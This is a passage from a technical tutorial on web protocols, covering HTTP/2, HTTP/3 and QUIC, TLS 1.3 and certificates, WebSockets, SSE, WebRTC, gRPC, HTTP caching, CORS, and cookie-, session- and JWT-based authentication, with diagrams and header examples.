2. **Connection overhead**: Opening a new TCP connection = 1 RTT (3-way handshake) + 1 RTT (TLS) minimum.

3. **Uncompressed headers**: Every request sends full headers. Cookie headers can be 4KB+. Repeated on every request.

4. **Workarounds** (all are hacks):
   - Domain sharding (multiple domains to get more parallel connections)
   - Sprite sheets (combine many small images into one)
   - CSS/JS concatenation (combine files to reduce requests)
   - Inlining (embed small resources in HTML)

---

## Chapter 7: HTTP/2 — Multiplexed and Binary

### 7.1 Key Improvements

HTTP/2 was published as RFC 7540 in 2015. It solves HTTP/1.1's performance problems while maintaining full semantic compatibility (same methods, status codes, headers).

### 7.2 Binary Framing Layer

HTTP/1.1 is text-based. HTTP/2 introduces a **binary framing layer**.

```
HTTP/1.1:
GET /index.html HTTP/1.1\r\n
Host: example.com\r\n
\r\n

HTTP/2:
┌──────────────────────────────┐
│ Frame: HEADERS               │
│ Stream ID: 1                 │
│ Flags: END_HEADERS           │
│ Payload: (compressed headers)│
└──────────────────────────────┘
```

Frame types: HEADERS, DATA, PRIORITY, RST_STREAM, SETTINGS, PUSH_PROMISE, PING, GOAWAY, WINDOW_UPDATE, CONTINUATION.

### 7.3 Multiplexing

Multiple requests and responses interleaved on a **single TCP connection**:

```
HTTP/1.1 (6 connections):
Connection 1: ====Request A========Response A====
Connection 2: ====Request B========Response B====
Connection 3: ====Request C========Response C====

HTTP/2 (1 connection, multiplexed):
Stream 1: ==Req A==........==Resp A (part 1)==....==Resp A (part 2)==
Stream 3: ........==Req B==........==Resp B==
Stream 5: ..==Req C==..==Resp C==
```

Each request/response pair is a **stream** with a unique ID. Frames from different streams are interleaved. No head-of-line blocking at the HTTP level.

### 7.4 Header Compression (HPACK)

HTTP headers are repetitive. `User-Agent`, `Accept`, `Cookie` — same values on every request.

HPACK compresses headers using:
1. **Static table**: 61 predefined common header name-value pairs
2. **Dynamic table**: Headers seen in this connection (both sides maintain)
3. **Huffman encoding**: Compress header values

Result: Subsequent requests send only the **differences** from the previous request. Header size drops by 85-90%.

### 7.5 Server Push

Server can proactively send resources before the client requests them:

```
Client: GET /index.html
Server: Here's index.html
        AND here's style.css (I know you'll need it)
        AND here's app.js (you'll need this too)
```

Implemented via `PUSH_PROMISE` frames. Client can cancel unwanted pushes with `RST_STREAM`.

In practice, server push has been **largely abandoned**. It's hard to avoid pushing resources the client already has cached. `103 Early Hints` is the preferred alternative.

### 7.6 Stream Prioritization

Clients can assign priority to streams:
- **Weight** (1-256): Relative importance
- **Dependency**: "Stream 3 depends on Stream 1"

This allows the server to allocate bandwidth intelligently (CSS before images, for example).

### 7.7 The Remaining Problem: TCP Head-of-Line Blocking

HTTP/2 solved HTTP-level HOL blocking, but introduced a new problem at the TCP level:

```
Stream 1: [Frame 1][Frame 2][Frame 3]
Stream 3: [Frame 1][Frame 2]
Stream 5: [Frame 1]

All on ONE TCP connection. If ONE TCP packet is lost:
→ TCP retransmits it
→ ALL streams stall until retransmission completes
→ Even unrelated streams are blocked
```

This is worse than HTTP/1.1 with multiple connections in high-loss networks.

This is why HTTP/3 exists.

---

## Chapter 8: HTTP/3 and QUIC — The Future

### 8.1 What Is QUIC?

QUIC (originally "Quick UDP Internet Connections") is a transport protocol built on **UDP**. It reimplements TCP's reliability features with key improvements, and integrates TLS 1.3 natively.

### 8.2 Why UDP?

TCP is implemented in **operating system kernels**. Changing TCP behavior requires OS updates — a decade-long process. UDP is a thin wrapper — you can build anything on top of it in **user space** and iterate rapidly.

### 8.3 QUIC's Key Features

#### Independent Streams (No HOL Blocking)

```
TCP (HTTP/2):
  All streams share one byte-stream
  Lost packet → ALL streams blocked

QUIC (HTTP/3):
  Each stream is independent
  Lost packet in Stream 1 → only Stream 1 blocked
  Streams 2, 3, 4 continue unaffected
```

#### Faster Connection Setup

```
TCP + TLS 1.3:
  1 RTT: TCP handshake (SYN, SYN-ACK, ACK)
  1 RTT: TLS handshake (ClientHello, ServerHello + Finished)
  = 2 RTT before first data

QUIC:
  1 RTT: QUIC handshake (combines transport + crypto)
  = 1 RTT before first data

QUIC 0-RTT (resumed connections):
  0 RTT: Send data immediately with cached keys
  = 0 RTT before first data (!!!)
```

**0-RTT caveat**: Replayed 0-RTT data is possible (replay attack). Only use for idempotent requests. Servers must implement replay protection.

#### Connection Migration

TCP connections are identified by `(source IP, source port, dest IP, dest port)`. Change your IP (Wi-Fi → cellular) and the connection breaks.

QUIC connections are identified by a **Connection ID** — a random value independent of network addresses. Switch networks → same QUIC connection continues seamlessly.

#### Built-in Encryption

TLS 1.3 is mandatory and integrated into QUIC. There is no unencrypted QUIC. Even most QUIC headers are encrypted (unlike TCP where headers are plaintext).

### 8.4 HTTP/3 over QUIC

HTTP/3 maps HTTP semantics onto QUIC streams:

```
HTTP/2 over TCP:
  One TCP connection → many HTTP/2 streams (multiplexed in one byte stream)

HTTP/3 over QUIC:
  One QUIC connection → many QUIC streams (truly independent)
  Each HTTP request = one QUIC stream
```

Header compression uses **QPACK** (adapted from HPACK for QUIC's out-of-order delivery).

### 8.5 Comparison Table

| Feature | HTTP/1.1 | HTTP/2 | HTTP/3 |
|---------|----------|--------|--------|
| Transport | TCP | TCP | QUIC (UDP) |
| Multiplexing | No | Yes | Yes |
| HOL Blocking | HTTP level | TCP level | None |
| Header Compression | None | HPACK | QPACK |
| Connection Setup | 2-3 RTT | 2-3 RTT | 1 RTT (0-RTT resumption) |
| Encryption | Optional | Effectively required | Mandatory (built-in) |
| Connection Migration | No | No | Yes |
| Server Push | No | Yes | Yes (rarely used) |

### 8.6 Adoption

As of 2025-2026, HTTP/3 is supported by all major browsers and is used by ~30% of web traffic. Google, Cloudflare, Facebook, and most CDNs support it. Discovery happens via the `Alt-Svc` HTTP header or DNS HTTPS records.

---

## Chapter 9: TLS/HTTPS — Security In Depth

### 9.1 The Threat Model

Without encryption, anyone between you and the server can:
- **Eavesdrop**: Read your passwords, tokens, data (confidentiality violation)
- **Tamper**: Modify requests/responses in transit (integrity violation)
- **Impersonate**: Pretend to be the server (authentication violation)

TLS solves all three.

### 9.2 TLS Version History

| Version | Year | Status |
|---------|------|--------|
| SSL 2.0 | 1995 | Broken. Do not use. |
| SSL 3.0 | 1996 | Broken (POODLE attack). Do not use. |
| TLS 1.0 | 1999 | Deprecated. Do not use. |
| TLS 1.1 | 2006 | Deprecated. Do not use. |
| TLS 1.2 | 2008 | Still widely supported. Acceptable. |
| TLS 1.3 | 2018 | Current standard. Use this. |

### 9.3 TLS 1.3 Handshake — Step by Step

```
    Client                                      Server
      │                                           │
      │──── ClientHello ────────────────────────→│
      │     - Supported TLS versions              │
      │     - Supported cipher suites             │
      │     - Client random (32 bytes)            │
      │     - Key share (ECDHE public key)        │
      │     - SNI (Server Name Indication)        │
      │                                           │
      │←─── ServerHello ────────────────────────│
      │     - Chosen TLS version                  │
      │     - Chosen cipher suite                 │
      │     - Server random (32 bytes)            │
      │     - Key share (ECDHE public key)        │
      │                                           │
      │     (Both sides now compute shared secret │
      │      using ECDHE key exchange)            │
      │                                           │
      │←─── {EncryptedExtensions} ──────────────│
      │←─── {Certificate} ──────────────────────│
      │     - Server's X.509 certificate chain    │
      │←─── {CertificateVerify} ────────────────│
      │     - Signature proving server owns cert  │
      │←─── {Finished} ─────────────────────────│
      │     - MAC of entire handshake transcript  │
      │                                           │
      │──── {Finished} ────────────────────────→│
      │                                           │
      │   ═══ Encrypted Application Data ═══════  │
```

**Key improvements in TLS 1.3 over 1.2:**
- **1-RTT handshake** (TLS 1.2 required 2 RTTs)
- **0-RTT resumption** (send data immediately on reconnection)
- **Removed insecure algorithms**: No RSA key exchange, no CBC mode, no SHA-1, no RC4
- **Encrypted handshake**: Certificate and most handshake messages are encrypted
- **Simplified cipher suites**: Only 5 cipher suites (vs. hundreds in TLS 1.2)

### 9.4 Cipher Suites

A cipher suite defines the algorithms used for:

```
TLS_AES_256_GCM_SHA384

TLS       → Protocol
AES_256   → Encryption algorithm (256-bit AES)
GCM       → Mode of operation (Galois/Counter Mode - AEAD)
SHA384    → Hash function for key derivation
```

TLS 1.3 cipher suites (only 5):
- `TLS_AES_128_GCM_SHA256`
- `TLS_AES_256_GCM_SHA384`
- `TLS_CHACHA20_POLY1305_SHA256`
- `TLS_AES_128_CCM_SHA256`
- `TLS_AES_128_CCM_8_SHA256`

Key exchange is always **ECDHE** (Elliptic Curve Diffie-Hellman Ephemeral) in TLS 1.3.

### 9.5 Key Exchange — ECDHE

**Problem**: How do two parties agree on a shared secret over an insecure channel?

**Diffie-Hellman Key Exchange** (simplified):
```
1. Both sides agree on a curve and base point (public parameters)
2. Client generates private key (a), computes public key (A = a × G)
3. Server generates private key (b), computes public key (B = b × G)
4. They exchange public keys (A, B)
5. Client computes: shared_secret = a × B
6. Server computes: shared_secret = b × A
7. Mathematically: a × B = a × (b × G) = b × (a × G) = b × A ✓
```

**Ephemeral** (the "E" in ECDHE): New keys generated for EVERY connection. Even if the server's long-term private key is compromised, past sessions can't be decrypted. This is **forward secrecy**.

### 9.6 Certificates and the Chain of Trust

#### What's In a Certificate (X.509)?
- **Subject**: Domain name (e.g., `*.google.com`)
- **Issuer**: Certificate Authority that signed it
- **Public Key**: Server's public key
- **Validity**: Not Before / Not After dates
- **Serial Number**: Unique identifier
- **Signature**: CA's digital signature
- **Extensions**: Subject Alternative Names (SANs), key usage

#### Certificate Chain:
```
Your browser trusts ────→ Root CA (self-signed, stored in OS/browser)
                                │
                                │ signs
                                ▼
                          Intermediate CA
                                │
                                │ signs
                                ▼
                          Server Certificate (leaf)
```

The server sends its leaf certificate + intermediate(s). The browser walks up the chain to a trusted root.

#### Certificate Authorities (CAs):
- **Let's Encrypt**: Free, automated. ~50% of all certs.
- **DigiCert**, **Sectigo**, **GlobalSign**: Commercial CAs.

#### Certificate Validation:
1. Is the certificate expired?
2. Is the issuer trusted (chain to root CA)?
3. Is the signature valid?
4. Does the domain match (Subject or SAN)?
5. Is the certificate revoked? (CRL or OCSP check)

### 9.7 Certificate Revocation

If a private key is compromised, the certificate must be revoked.

**CRL (Certificate Revocation List)**: CA publishes a list of revoked certificates. Browser downloads and checks. Problem: Lists get large, slow to update.

**OCSP (Online Certificate Status Protocol)**: Browser asks the CA "Is this cert revoked?" in real-time. Problem: Privacy (CA knows which sites you visit), availability (if OCSP server is down, what happens?).

**OCSP Stapling**: The SERVER fetches its own OCSP response from the CA and "staples" it to the TLS handshake. No privacy leak. No extra round-trip for the browser.

### 9.8 Certificate Pinning

**Problem**: Any trusted CA can issue a certificate for any domain. A compromised CA could issue a fake `google.com` cert.

**Solution**: Pin the expected certificate (or public key) in the client. If the server presents a different cert, reject it.

**HPKP (HTTP Public Key Pinning)**: Deprecated. Too dangerous — misconfiguration locks users out permanently.

**Modern approach**: Certificate Transparency (CT) logs. All certificates must be logged publicly. Monitors detect unauthorized certificates.

### 9.9 HSTS — HTTP Strict Transport Security

```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

Tells the browser: "NEVER connect to this domain over HTTP. Always use HTTPS."

**HSTS Preload List**: Hardcoded into browsers. Even the first connection is HTTPS. Submit your domain to `hstspreload.org`.

### 9.10 mTLS — Mutual TLS

Standard TLS: Only the server presents a certificate (server authentication).

**mTLS**: Both client AND server present certificates (mutual authentication).

```
Server: "Here's my certificate"
Client: "Here's MY certificate"
Both: (verified, connection established)
```

Use cases:
- Service-to-service communication in microservices
- Zero-trust networks
- IoT device authentication

---

## Chapter 10: WebSockets — Full-Duplex Communication

### 10.1 The Problem HTTP Can't Solve

HTTP is request-response. The client asks, the server answers. The server **cannot initiate** communication.

For real-time applications (chat, live sports, collaboration), you need the server to push data whenever it wants.

### 10.2 WebSocket Protocol

WebSocket provides **full-duplex, persistent communication** over a single TCP connection.

### 10.3 The Handshake (HTTP Upgrade)

WebSocket starts as an HTTP request and "upgrades":

```
Client → Server (HTTP Request):
GET /chat HTTP/1.1
Host: example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat, superchat
Origin: https://example.com

Server → Client (HTTP Response):
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
Sec-WebSocket-Protocol: chat
```

**Sec-WebSocket-Accept** = Base64(SHA-1(Sec-WebSocket-Key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11")). This proves the server understands WebSocket (not just any HTTP server).

### 10.4 Frame Format

After handshake, communication switches from HTTP to WebSocket frames:

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├─┼─┼─┼─┼─────────┼─┼─────────────────┤
│F│R│R│R│  opcode │M│  Payload length │  Extended payload length
│I│S│S│S│  (4)    │A│     (7)        │  (16/64 bits if needed)
│N│V│V│V│         │S│                │
│ │1│2│3│         │K│                │
├─┴─┴─┴─┴─────────┴─┴────────────────┤
│  Masking key (32 bits, if MASK=1)   │
├─────────────────────────────────────┤
│  Payload data                       │
└─────────────────────────────────────┘
```

Opcodes:
- `0x1` — Text frame
- `0x2` — Binary frame
- `0x8` — Connection close
- `0x9` — Ping
- `0xA` — Pong

### 10.5 Ping/Pong — Keep Alive

Either side can send a **Ping**. The other MUST respond with a **Pong** containing the same payload. This detects dead connections.

```
Client: PING ("heartbeat")
Server: PONG ("heartbeat")
```

### 10.6 Closing the Connection

```
Client: Close frame (status code: 1000 "Normal Closure", reason: "Done")
Server: Close frame (status code: 1000, reason: "Goodbye")
TCP connection closed
```

Close codes:
- `1000` — Normal closure
- `1001` — Going away (page navigation)
- `1002` — Protocol error
- `1003` — Unsupported data
- `1006` — Abnormal closure (no close frame received)
- `1011` — Server error

### 10.7 WebSocket vs HTTP — When to Use Which

| Criteria | HTTP | WebSocket |
|----------|------|-----------|
| Communication pattern | Request-response | Bidirectional |
| Latency | Per-request overhead | No per-message overhead |
| Server push | No (client must poll) | Yes |
| Connection | Short-lived or keep-alive | Long-lived persistent |
| Scalability | Stateless, easy to scale | Stateful, harder to scale |
| Use cases | REST APIs, web pages | Chat, gaming, live feeds |

### 10.8 Scaling WebSockets

WebSocket connections are **stateful** — the server must maintain the connection. This makes horizontal scaling harder.

Solutions:
- **Sticky sessions**: Load balancer routes same client to same server
- **Pub/Sub backbone**: Redis Pub/Sub, Kafka, or NATS between servers
- **Dedicated WebSocket service**: Separate from REST API servers

---

## Chapter 11: Server-Sent Events (SSE)

### 11.1 What Is SSE?

Server-Sent Events is a **one-way** (server → client) real-time protocol built on plain HTTP.

### 11.2 How It Works

```
Client:
GET /events HTTP/1.1
Accept: text/event-stream

Server:
HTTP/1.1 200 OK
Content-Type: text/event-stream
Cache-Control: no-cache
Connection: keep-alive

data: {"message": "Hello"}

data: {"message": "World"}

event: notification
data: {"type": "alert", "text": "Server restarting"}

id: 42
data: {"message": "Message with ID"}

retry: 5000
data: {"message": "Reconnect after 5 seconds if disconnected"}
```

### 11.3 Event Format

```
event: <event-type>     (optional, default is "message")
id: <event-id>          (optional, used for reconnection)
data: <payload>         (required, can be multi-line)
retry: <milliseconds>   (optional, reconnect interval)

(blank line = end of event)
```

### 11.4 Auto-Reconnection

If the connection drops, the browser **automatically reconnects** and sends the last event ID:

```
GET /events HTTP/1.1
Last-Event-ID: 42
```

The server can resume from where it left off. This is built into the `EventSource` API — zero client-side code needed.

### 11.5 SSE vs WebSocket

| Feature | SSE | WebSocket |
|---------|-----|-----------|
| Direction | Server → Client only | Bidirectional |
| Protocol | HTTP | WebSocket (ws://) |
| Reconnection | Automatic, built-in | Manual implementation |
| Data format | Text only | Text or binary |
| HTTP/2 support | Yes (multiplexed) | No (requires HTTP/1.1 upgrade) |
| Proxy/firewall compatibility | Excellent (it's just HTTP) | Can be problematic |
| Browser API | `EventSource` (simple) | `WebSocket` (more complex) |

**Use SSE when**: Server pushes updates, client just listens (notifications, live feeds, stock tickers, build logs).

**Use WebSocket when**: Both sides need to send data (chat, gaming, collaboration).

---

## Chapter 12: WebRTC — Peer-to-Peer in the Browser

### 12.1 What Is WebRTC?

**Web Real-Time Communication** — enables peer-to-peer audio, video, and data transfer directly between browsers, without going through a server.

### 12.2 Why Peer-to-Peer?

```
Traditional (through server):
  User A ──→ Server ──→ User B
  Latency: A→Server + Server→B

WebRTC (peer-to-peer):
  User A ────────────→ User B
  Latency: A→B (shorter path)
```

Lower latency, less server bandwidth, better privacy.

### 12.3 The Challenge — NAT Traversal

Most devices are behind NAT. They have private IPs. Two devices behind different NATs can't directly connect.

#### ICE (Interactive Connectivity Establishment)

ICE tries multiple strategies to establish a connection:

```
Strategy 1: Direct connection (both on same network)
            → Works: Use it!

Strategy 2: STUN (Session Traversal Utilities for NAT)
            → Ask a STUN server "What's my public IP and port?"
            → Share that info with the peer
            → Try to connect using public IP:port
            → Works ~80% of the time (depends on NAT type)

Strategy 3: TURN (Traversal Using Relays around NAT)
            → Use a relay server to forward traffic
            → Always works, but adds latency and server cost
            → Fallback when STUN fails
```

### 12.4 Signaling

Before peers can connect, they need to exchange:
1. **SDP (Session Description Protocol)**: Media capabilities (codecs, formats)
2. **ICE candidates**: Network addresses/ports to try

This exchange happens through a **signaling server** (your server, using WebSocket or HTTP). WebRTC doesn't define signaling — use any mechanism.

```
User A                    Signaling Server                User B
  │                            │                            │
  │── Create Offer (SDP) ────→│                            │
  │                            │── Forward Offer ─────────→│
  │                            │                            │
  │                            │←── Create Answer (SDP) ──│
  │←── Forward Answer ────────│                            │
  │                            │                            │
  │── ICE Candidates ────────→│── Forward ────────────────→│
  │←── Forward ───────────────│←── ICE Candidates ────────│
  │                            │                            │
  │════════ Direct P2P Connection Established ══════════════│
```

### 12.5 WebRTC Protocols Stack

```
┌─────────────────────────────────────────┐
│ Application (Audio/Video/Data)          │
├──────────┬────────────────┬─────────────┤
│  SRTP    │    SCTP        │             │
│ (Secure  │ (Data Channels)│             │
│  RTP)    │                │             │
├──────────┴────────────────┤             │
│           DTLS            │             │
│    (TLS over UDP)         │             │
├───────────────────────────┤             │
│           ICE             │             │
├───────────────────────────┤             │
│       STUN / TURN         │             │
├───────────────────────────┤             │
│           UDP             │             │
└───────────────────────────┘             │
```

- **SRTP**: Encrypted audio/video
- **SCTP**: Reliable or unreliable data channels (you choose per channel)
- **DTLS**: TLS but for UDP (used for key exchange and encryption)

### 12.6 Data Channels

Beyond audio/video, WebRTC provides **data channels** — arbitrary data transfer between peers:
- **Reliable or unreliable** (you choose)
- **Ordered or unordered** (you choose)
- Use cases: File transfer, gaming, collaboration

---

## Chapter 13: gRPC — High-Performance RPC

### 13.1 What Is gRPC?

**gRPC Remote Procedure Call** — a high-performance RPC framework by Google. Built on **HTTP/2** and **Protocol Buffers**.

### 13.2 Protocol Buffers (Protobuf)

Binary serialization format. Define your API in `.proto` files:

```protobuf
syntax = "proto3";

service UserService {
  rpc GetUser (GetUserRequest) returns (User);
  rpc ListUsers (ListUsersRequest) returns (stream User);
  rpc CreateUser (User) returns (User);
  rpc Chat (stream Message) returns (stream Message);
}

message GetUserRequest {
  int32 id = 1;
}

message User {
  int32 id = 1;
  string name = 2;
  string email = 3;
}
```

Protobuf is **10-100x smaller** and **20-100x faster** to parse than JSON.

### 13.3 Four Communication Patterns

```
1. Unary RPC (like REST):
   Client ──Request──→ Server
   Client ←─Response──  Server

2. Server Streaming:
   Client ──Request──→ Server
   Client ←─Response 1──  Server
   Client ←─Response 2──  Server
   Client ←─Response N──  Server

3. Client Streaming:
   Client ──Request 1──→ Server
   Client ──Request 2──→ Server
   Client ──Request N──→ Server
   Client ←─Response──  Server

4. Bidirectional Streaming:
   Client ──Request 1──→ Server
   Client ←─Response 1──  Server
   Client ──Request 2──→ Server
   Client ←─Response 2──  Server
   (interleaved freely)
```

### 13.4 gRPC vs REST

| Feature | REST/JSON | gRPC/Protobuf |
|---------|-----------|---------------|
| Format | Text (JSON) | Binary (Protobuf) |
| Transport | HTTP/1.1 or HTTP/2 | HTTP/2 only |
| Contract | OpenAPI (optional) | `.proto` file (required) |
| Streaming | SSE (server only) | All 4 patterns |
| Code generation | Optional | Built-in |
| Browser support | Native | Requires gRPC-Web proxy |
| Payload size | Larger | 10-100x smaller |
| Performance | Good | Excellent |
| Human readable | Yes | No (binary) |

**Use REST when**: Public APIs, browser-first apps, simple CRUD, human debugging needed.

**Use gRPC when**: Service-to-service communication, high throughput, low latency, streaming needed.

---

## Chapter 14: Caching — The Performance Multiplier

### 14.1 Why Caching Matters

The fastest request is one that never happens. Caching stores responses for reuse, eliminating:
- Network round-trips
- Server processing
- Database queries

### 14.2 Caching Layers

```
┌─────────────────────────────────────────────────────┐
│ Browser Cache (memory, disk)                        │ ← Fastest
├─────────────────────────────────────────────────────┤
│ Service Worker Cache (PWA)                          │
├─────────────────────────────────────────────────────┤
│ CDN Edge Cache (Cloudflare, CloudFront)             │
├─────────────────────────────────────────────────────┤
│ Reverse Proxy Cache (Nginx, Varnish)                │
├─────────────────────────────────────────────────────┤
│ Application Cache (Redis, Memcached)                │
├─────────────────────────────────────────────────────┤
│ Database Query Cache                                │
├─────────────────────────────────────────────────────┤
│ Database (actual storage)                           │ ← Slowest
└─────────────────────────────────────────────────────┘
```

### 14.3 HTTP Cache Headers — Complete Reference

#### Cache-Control (the most important header)

```
Cache-Control: max-age=3600, public, must-revalidate
```

| Directive | Meaning |
|-----------|---------|
| `max-age=N` | Cache for N seconds from response time |
| `s-maxage=N` | Same as max-age but for shared caches (CDN) only |
| `public` | Any cache can store (even authenticated responses) |
| `private` | Only browser cache (not CDN or proxies) |
| `no-cache` | MUST revalidate with server before using cached copy |
| `no-store` | NEVER store. No caching at all. For sensitive data. |
| `must-revalidate` | Once expired, MUST revalidate (don't serve stale) |
| `stale-while-revalidate=N` | Serve stale for N seconds while revalidating in background |
| `stale-if-error=N` | Serve stale for N seconds if origin is down |
| `immutable` | Content will NEVER change. Don't revalidate ever. |

#### Conditional Requests (Revalidation)

```
First request:
  GET /api/data HTTP/1.1

  HTTP/1.1 200 OK
  ETag: "abc123"
  Last-Modified: Sat, 21 Mar 2026 10:00:00 GMT
  Cache-Control: max-age=60

After 60 seconds (cache expired):
  GET /api/data HTTP/1.1
  If-None-Match: "abc123"
  If-Modified-Since: Sat, 21 Mar 2026 10:00:00 GMT

  HTTP/1.1 304 Not Modified    ← No body! Saves bandwidth.
```

**ETag** (Entity Tag): A fingerprint of the content. Can be a hash, version number, or any string. Strong ETags (`"abc"`) = byte-for-byte identical. Weak ETags (`W/"abc"`) = semantically equivalent.

### 14.4 Caching Strategies for Static Assets

```
HTML pages:
  Cache-Control: no-cache
  (Always revalidate — ensures users get latest version)

CSS/JS with content hash in filename (app.a1b2c3.js):
  Cache-Control: public, max-age=31536000, immutable
  (Cache forever — filename changes when content changes)

API responses:
  Cache-Control: private, max-age=60, stale-while-revalidate=300
  (Cache 60s, serve stale up to 5 min while refreshing)

User-specific data:
  Cache-Control: private, no-store
  (Never cache in shared caches)
```

### 14.5 Cache Invalidation

> "There are only two hard things in Computer Science: cache invalidation and naming things."
> — Phil Karlton

Strategies:
1. **TTL-based**: Cache expires after N seconds. Simple, but stale data during TTL.
2. **Event-driven**: Publish cache invalidation events when data changes.
3. **Content-hashed URLs**: Change URL when content changes. Old cached version is never served.
4. **Purge APIs**: CDN APIs to explicitly invalidate cached resources.

### 14.6 Vary Header

```
Vary: Accept-Encoding, Accept-Language
```

Tells caches: "This response varies based on these request headers. Cache separate versions for each combination."

Without `Vary`, a cache might serve a gzipped response to a client that doesn't support gzip.

---

## Chapter 15: CORS — Cross-Origin Resource Sharing

### 15.1 Same-Origin Policy

The browser's fundamental security model. JavaScript from one **origin** cannot access resources from a different origin.

**Origin** = **scheme** + **host** + **port**

| URL | Origin |
|-----|--------|
| `https://app.example.com:443/page` | `https://app.example.com:443` |
| `http://app.example.com/page` | `http://app.example.com:80` |
| `https://api.example.com/data` | `https://api.example.com:443` |

`https://app.example.com` and `https://api.example.com` are **different origins** (different hosts).

### 15.2 What CORS Allows

CORS lets servers explicitly opt in to cross-origin requests.

### 15.3 Simple Requests

A request is "simple" if:
- Method: GET, HEAD, or POST
- Headers: Only standard headers (Accept, Content-Type with specific values, etc.)
- Content-Type: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`

```
Browser (https://app.com):
GET /api/data HTTP/1.1
Host: api.other.com
Origin: https://app.com

Server (https://api.other.com):
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://app.com
```

If the `Access-Control-Allow-Origin` header matches, the browser allows the response. Otherwise, it blocks it (the request still went to the server, but the browser hides the response from JavaScript).

### 15.4 Preflight Requests

For "non-simple" requests (PUT, DELETE, custom headers, JSON content-type), the browser sends a **preflight** OPTIONS request first:

```
Step 1: Browser sends preflight
OPTIONS /api/users/42 HTTP/1.1
Host: api.other.com
Origin: https://app.com
Access-Control-Request-Method: DELETE
Access-Control-Request-Headers: Authorization, X-Custom-Header

Step 2: Server responds with permissions
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Authorization, X-Custom-Header
Access-Control-Max-Age: 86400
Access-Control-Allow-Credentials: true

Step 3: If preflight passes, browser sends actual request
DELETE /api/users/42 HTTP/1.1
Host: api.other.com
Origin: https://app.com
Authorization: Bearer eyJ...
```

### 15.5 CORS Headers — Complete Reference

| Header | Direction | Purpose |
|--------|-----------|---------|
| `Origin` | Request | The origin making the request |
| `Access-Control-Allow-Origin` | Response | Which origins are allowed. Use specific origin or `*` (but not with credentials). |
| `Access-Control-Allow-Methods` | Response (preflight) | Which HTTP methods are allowed |
| `Access-Control-Allow-Headers` | Response (preflight) | Which request headers are allowed |
| `Access-Control-Expose-Headers` | Response | Which response headers JS can read (by default only 6 "safe" headers are exposed) |
| `Access-Control-Max-Age` | Response (preflight) | How long to cache preflight result (seconds) |
| `Access-Control-Allow-Credentials` | Response | Allow cookies/auth headers cross-origin |
| `Access-Control-Request-Method` | Request (preflight) | The method the actual request will use |
| `Access-Control-Request-Headers` | Request (preflight) | The headers the actual request will use |

### 15.6 Common CORS Mistakes

1. **`Access-Control-Allow-Origin: *` with credentials**: Not allowed. Must specify exact origin.
2. **Missing `Access-Control-Expose-Headers`**: Custom response headers invisible to JS.
3. **Preflight caching too short**: Unnecessary OPTIONS requests on every API call.
4. **Not handling OPTIONS method**: Server returns 405 for OPTIONS → preflight fails → all cross-origin requests fail.

---

## Chapter 16: Cookies, Sessions, and Authentication

### 16.1 Cookies — The Complete Picture

Cookies are small pieces of data (max 4KB) that the server stores on the client via HTTP headers.

#### Setting a Cookie:
```
Set-Cookie: session_id=abc123; Domain=.example.com; Path=/; Max-Age=86400; HttpOnly; Secure; SameSite=Lax
```

#### Cookie Attributes:

| Attribute | Purpose | Default |
|-----------|---------|---------|
| `Domain` | Which domains receive the cookie | Current domain only |
| `Path` | Which paths receive the cookie | Current path |
| `Max-Age` | Seconds until expiration | Session (browser close) |
| `Expires` | Absolute expiration date | Session |
| `HttpOnly` | JavaScript cannot access (`document.cookie`) | No (JS CAN access) |
| `Secure` | Only sent over HTTPS | No (sent over HTTP too) |
| `SameSite=Strict` | Never sent cross-site | — |
| `SameSite=Lax` | Sent on top-level navigations only | Default in modern browsers |
| `SameSite=None` | Always sent cross-site (requires `Secure`) | — |

#### How Cookies Flow:
```
1. Client sends request (no cookies yet)
2. Server response: Set-Cookie: session=abc123; HttpOnly; Secure
3. Browser stores cookie
4. Every subsequent request to same domain:
   Cookie: session=abc123
5. Server reads cookie, identifies session
```

### 16.2 Session-Based Authentication

```
┌──────────┐                        ┌──────────┐
│  Client  │                        │  Server   │
└────┬─────┘                        └────┬─────┘
     │                                    │
     │── POST /login (username, password)→│
     │                                    │── Validate credentials
     │                                    │── Create session in store (Redis/DB)
     │                                    │── Session ID: "xyz789"
     │←── Set-Cookie: session=xyz789 ────│
     │                                    │
     │── GET /dashboard ────────────────→│
     │   Cookie: session=xyz789           │── Look up session "xyz789"
     │                                    │── Found: user_id=42
     │←── 200 OK (dashboard for user 42)─│
     │                                    │
     │── POST /logout ──────────────────→│
     │   Cookie: session=xyz789           │── Delete session "xyz789"
     │←── Set-Cookie: session=; Max-Age=0│
```

**Pros**: Server has full control. Can revoke instantly. Session data doesn't travel with every request.
**Cons**: Server-side storage required. Harder to scale horizontally (need shared session store).

### 16.3 Token-Based Authentication (JWT)

**JWT (JSON Web Token)**: A self-contained token with three parts:

```
Header.Payload.Signature

eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo0MiwiZXhwIjoxNjk...  .SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Header (Base64):
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload (Base64):
{
  "user_id": 42,
  "email": "user@example.com",
  "role": "admin",
  "exp": 1711000800,
  "iat": 1710914400,
  "iss": "api.example.com"
}

Signature:
HMAC-SHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret_key
)
```

**Flow:**
```
1. Client: POST /login (credentials)
2. Server: Validate → create JWT → return in response body
3. Client: Store in memory (or httpOnly cookie)
4. Client: Every request → Authorization: Bearer <jwt>
5. Server: Verify signature → extract user info → no DB lookup needed
```

**Pros**: Stateless. Server doesn't store sessions. Scales horizontally easily.
**Cons**: Cannot revoke until expiry. Token size grows with claims. Must handle token refresh.

### 16.4 Token Refresh Pattern

```
Access Token:  Short-lived (15 minutes). Used for API requests.
Refresh Token: Long-lived (7 days). Used only to get new access tokens.

Flow:
1. Login → receive access_token + refresh_token
